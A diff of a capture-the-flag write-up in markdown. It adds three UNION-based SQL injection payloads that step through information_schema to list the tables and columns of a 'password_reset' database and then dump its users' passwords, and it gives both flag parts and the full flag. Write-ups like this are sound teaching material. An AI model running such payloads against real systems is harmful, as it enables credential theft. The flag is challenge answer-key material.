@@ -41,10 +41,23 @@
 
 ![image](https://github.com/user-attachments/assets/0acccc85-a447-4d66-9a66-e1cae136e70e)
 
-### Part 1 : `UVT{Th3_sy5t3M_7ru5Ts_1tS_oWn_9r4Mmar_..._`
+#### Part 1 : `UVT{Th3_sy5t3M_7ru5Ts_1tS_oWn_9r4Mmar_..._`
 
+`' UNION SELECT NULL,NULL,NULL,table_name FROM information_schema.tables WHERE table_schema='password_reset'-- -`
 
-### Flag
+![image](https://github.com/user-attachments/assets/491c5a34-85c8-44a4-815b-bafada399132)
+
+`' UNION SELECT NULL,NULL,NULL,column_name FROM information_schema.columns WHERE table_schema='password_reset' AND table_name='users'-- -`
+
+![image](https://github.com/user-attachments/assets/abe1f29a-3d7e-4ae6-9704-c16825e729af)
+
+`' UNION SELECT NULL,NULL,NULL,password FROM password_reset.users-- -`
+
+![image](https://github.com/user-attachments/assets/ea22609b-3cdb-4a6f-adbe-c8f9065cee51)
+
+#### Part 2: `S0_5tR1ng5_4r3_m0r3_tHaN_qu3r13s_1n_th3_3nd}`
+
+#### Flag
 > UVT{Th3_sy5t3M_7ru5Ts_1tS_oWn_9r4Mmar_..._S0_5tR1ng5_4r3_m0r3_tHaN_qu3r13s_1n_th3_3nd}
 
 </details>
